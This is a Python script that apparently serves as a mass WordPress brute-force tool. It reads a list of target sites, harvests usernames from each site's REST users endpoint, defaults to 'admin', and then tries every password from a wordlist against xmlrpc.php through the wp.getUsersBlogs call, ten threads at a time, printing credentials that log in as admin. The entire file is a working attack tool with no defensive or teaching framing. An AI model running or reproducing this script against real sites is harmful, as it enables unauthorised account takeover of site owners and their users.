import requests,argparse,sys,json,time
from termcolor import colored
from concurrent.futures import ThreadPoolExecutor

r, g, b, c, m, y, w, bo, un = "\033[0;31;40m","\033[0;32;40m","\033[0;34;40m","\033[0;36m",'\033[95m',"\033[0;33;40m","\033[0m","\033[1m","\033[4m"

def fetching_user(url):
	print(f'{y}[!] Fetching user from {url}{w}')
	user_list = []
	try:
		req = requests.get(url+"/wp-json/wp/v2/users/", allow_redirects=False, timeout=5).content.decode('utf-8')
		try:
			print(f'{g}[+] Success Fetching user from {url}{w}')
			for x in json.loads(req):
				user_list.append(x['slug'])
		except ValueError:
			print(f'[!] Failed {url} to Decoding json\n')
		
	except Exception as e:
		pass

	return user_list
def check_array(arr): 
    if len(arr) == 0: 
        return 0
    else: 
        return 1

def save(format):
	s = open('bfresult.txt', 'a')
	s.write(format+"\n")

def exploit(url, user_url, list_password):
	try:
		payloads = """<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>{}</value></param><param><value>{}</value></param></params></methodCall>""".format(user_url, list_password)

		headers = {'Content-Type':'text/xml'}
		r = requests.post('{}/xmlrpc.php'.format(url), headers=headers,data=payloads, timeout=15)
		if 'isAdmin' in str(r.content):
			print(f'{g}{bo}[+] {url}:{user_url}:{list_password}{w}')
		else:
			print(f'{r}{bo}[+] {url}:{user_url}:{list_password}{w}')
	except requests.exceptions.ConnectionError as e:
		pass
	except Exception as e:
			pass

def brute_url(url):
	try:
		username_url = fetching_user(url)
		user = []
		if check_array(username_url):
			for username in username_url:
				user.append(username)
		else:
			print(f'[-] Try with default username admin')
			user.append('admin')

		password = 'pw.txt'

		with ThreadPoolExecutor(max_workers=10) as executor:
			for user_url in user:
				with open(password, 'r') as password_list:
					for list_password in password_list:
						executor.submit(exploit, url, user_url, list_password)


			user.clear()
	except requests.exceptions.ConnectionError as e:
		pass
	except Exception as e:
		pass

def main():
	file = input('[-] Enter sites list: ')
	try:
		with open(file, 'r') as victim:
			print('[+] Brute forcing')
			for sites in victim:
				url = sites.rstrip()
				brute_url(url)
				print('[+] Done')
	except IOError as e:
		pass
		sys.exit()

if __name__ == '__main__':
	main()